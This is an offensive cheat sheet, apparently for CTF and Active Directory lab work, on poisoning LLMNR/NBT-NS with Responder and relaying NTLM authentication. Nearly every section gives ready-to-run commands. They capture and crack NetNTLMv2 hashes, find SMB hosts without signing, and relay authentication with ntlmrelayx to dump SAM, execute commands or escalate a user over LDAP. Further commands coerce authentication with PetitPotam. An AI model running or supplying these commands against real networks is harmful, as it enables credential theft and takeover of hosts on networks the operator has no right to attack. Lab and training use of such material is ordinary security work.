# Responder & NTLM relay cheat sheet

Responder poisons **LLMNR / NBT-NS / mDNS** broadcasts on the local network:
when a Windows host mistypes a hostname or looks up a share that doesn't
resolve, it broadcasts "who is X?", Responder answers "me!", and the victim
authenticates to you — handing over a **NetNTLMv2 hash** you can crack or relay.
This is a *network-position* attack: you must be on the same L2 segment (a
shelled internal host, a VLAN you can reach, an AD lab).

## 1. Capture hashes (poison + listen)
```bash
sudo responder -I eth0                    # -I = your interface on the target LAN
sudo responder -I eth0 -wv                # verbose, with WPAD rogue proxy
# Hashes land in /usr/share/responder/logs/  and print live:
#   [SMB] NTLMv2-SSP Hash : user::DOMAIN:1122...:....
```
Crack them:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## 2. Is relaying possible? — the SMB-signing check
Relaying only works against hosts where **SMB signing is NOT required**.
Find those first:
```bash
# netexec flags signing:False hosts (relayable)
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
netexec smb 10.10.10.0/24                 # look for "signing:False"
nmap --script smb2-security-mode -p445 10.10.10.0/24
```
> scryer reports per-host SMB signing status and calls out relay/Responder
> opportunities when it sees signing disabled on a Windows/AD target.

## 3. Relay instead of crack (no cracking needed)
Turn OFF Responder's SMB/HTTP servers first (`/etc/responder/Responder.conf`:
`SMB = Off`, `HTTP = Off`) so ntlmrelayx can bind them.
```bash
# Relay captured auth to a signing-disabled host and dump SAM:
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay to a shell / command exec:
sudo impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support -c "whoami"

# Relay to LDAP (great for ADCS ESC8 / delegation abuse):
sudo impacket-ntlmrelayx -t ldap://dc01 --escalate-user lowpriv
```
Then trigger auth (Responder poisoning, or coerce with PetitPotam / PrinterBug):
```bash
sudo responder -I eth0                     # in another terminal, SMB/HTTP off
python3 PetitPotam.py 10.10.14.5 10.10.10.20
```

## Quick decision tree
1. On the LAN but no creds? → `responder -I eth0`, wait, crack NetNTLMv2.
2. Signing disabled somewhere? → relay (ntlmrelayx) instead of cracking.
3. Nothing biting? → coerce auth (PetitPotam/PrinterBug/`WebClient` MS-EFSR).

> Careful in shared CTF/exam environments — Responder poisons **everyone's**
> traffic on that segment. Scope it (`Responder.conf` analyze-mode `-A` first to
> just observe) before poisoning.
